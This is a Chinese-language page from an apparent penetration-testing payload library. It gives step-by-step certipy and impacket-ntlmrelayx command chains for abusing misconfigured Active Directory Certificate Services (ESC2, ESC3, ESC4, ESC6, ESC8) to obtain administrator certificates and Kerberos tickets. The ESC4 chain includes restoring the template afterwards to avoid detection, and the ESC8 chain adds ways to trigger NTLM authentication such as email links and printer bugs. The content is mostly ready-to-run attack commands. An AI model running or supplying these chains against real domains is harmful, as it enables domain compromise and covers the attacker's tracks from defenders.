<!-- Language: mixed | Chinese ratio: 14.25% -->
# 内网/后渗透 — ADCS 攻击 payload 库

> 父文档:[00-index.md](00-index.md) · ⚠️ SRC 场景下大多受限,见 [../compliance.md](../compliance.md)
> 涵盖:ESC1 / ESC2 / ESC3 / ESC4 / ESC8 模板滥用与证书申请

---

### ADCS ESC2攻击  `adcs-esc2`
利用ESC2模板配置错误
子类：**ESC2** · tags: `adcs` `esc2` `certificate`

**前置条件：** 域环境；ADCS服务；存在ESC2模板

**攻击链：**

**1. 探测ESC2模板**  _[linux]_
_探测ESC2模板_
```text
certipy find -u user@domain.com -p password -dc-ip DC_IP
查找Any Purpose或CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT模板
```text

**2. 请求证书**  _[linux]_
_请求管理员证书_
```text
certipy req -u user@domain.com -p password -ca CA_NAME -target DC_IP -template VULNERABLE_TEMPLATE -upn administrator@domain.com
```text

**3. 使用证书认证**  _[linux]_
_使用证书认证_
```text
certipy auth -pfx administrator.pfx -dc-ip DC_IP
获取管理员TGT
```text

---

### ADCS ESC3攻击  `adcs-esc3`
利用ESC3注册代理配置错误
子类：**ESC3** · tags: `adcs` `esc3` `certificate`

**前置条件：** 域环境；ADCS服务；存在ESC3配置

**攻击链：**

**1. 探测ESC3**  _[linux]_
_探测ESC3配置_
```text
certipy find -u user@domain.com -p password -dc-ip DC_IP
查找具有Enrollment Agent权限的模板
```text

**2. 获取注册代理证书**  _[linux]_
_获取注册代理证书_
```text
certipy req -u user@domain.com -p password -ca CA_NAME -template EnrollmentAgent
获取注册代理证书
```text

**3. 代表其他用户请求证书**  _[linux]_
_代表管理员请求证书_
```text
certipy req -u user@domain.com -p password -ca CA_NAME -template User -on-behalf-of DOMAIN\\Administrator -pfx agent.pfx
```text

---

### ADCS ESC4攻击  `adcs-esc4`
利用ESC4模板权限配置错误
子类：**ESC4** · tags: `adcs` `esc4` `certificate`

**前置条件：** 域环境；ADCS服务；对模板有写权限

**攻击链：**

**1. 探测ESC4**  _[linux]_
_探测模板权限_
```text
certipy find -u user@domain.com -p password -dc-ip DC_IP
查找用户有写权限的模板
```text

**2. 修改模板配置**  _[linux]_
_修改模板配置_
```text
certipy template -u user@domain.com -p password -template VULNERABLE_TEMPLATE -save-old
修改模板为ESC1配置
```text

**3. 请求证书**  _[linux]_
_请求管理员证书_
```text
certipy req -u user@domain.com -p password -ca CA_NAME -template VULNERABLE_TEMPLATE -upn administrator@domain.com
```text

**4. 恢复模板配置**  _[linux]_
_恢复模板配置_
```text
certipy template -u user@domain.com -p password -template VULNERABLE_TEMPLATE -configuration old_config.json
恢复原配置避免检测
```text

---

### ADCS ESC6攻击  `adcs-esc6`
利用ESC6编辑标志配置错误
子类：**ESC6** · tags: `adcs` `esc6` `certificate`

**前置条件：** 域环境；ADCS服务；CA启用EDITF_ATTRIBUTESUBJECTALTNAME2

**攻击链：**

**1. 探测ESC6**  _[linux]_
_探测CA配置_
```text
certipy find -u user@domain.com -p password -dc-ip DC_IP
查找EDITF_ATTRIBUTESUBJECTALTNAME2标志
```text

**2. 请求证书**  _[linux]_
_请求管理员证书_
```text
certipy req -u user@domain.com -p password -ca CA_NAME -template User -alt administrator@domain.com
使用-alt参数指定SAN
```text

**3. 使用证书认证**  _[linux]_
_认证获取TGT_
```text
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```text

---

### ADCS ESC8攻击  `adcs-esc8`
利用ESC8 HTTP端点进行NTLM中继
子类：**ESC8** · tags: `adcs` `esc8` `ntlm-relay`

**前置条件：** 域环境；ADCS HTTP端点；可触发NTLM认证

**攻击链：**

**1. 探测ESC8**  _[linux]_
_探测HTTP端点_
```text
certipy find -u user@domain.com -p password -dc-ip DC_IP
查找HTTP证书端点
```text

**2. 设置NTLM中继**  _[linux]_
_设置NTLM中继_
```text
impacket-ntlmrelayx -t http://CA_SERVER/certsrv/certfnsh.asp -smb2support --adcs
监听NTLM认证并中继到ADCS
```text

**3. 触发认证**
_触发目标NTLM认证_
```text
使用多种方式触发:
- 发送邮件链接
- 打印机漏洞
- WebDAV
- 其他NTLM触发方式
```text

---

---

← 回 [00-index.md](00-index.md) · 上一篇:[`18-exchange.md`](18-exchange.md) · 下一篇:[`20-sharepoint.md`](20-sharepoint.md)
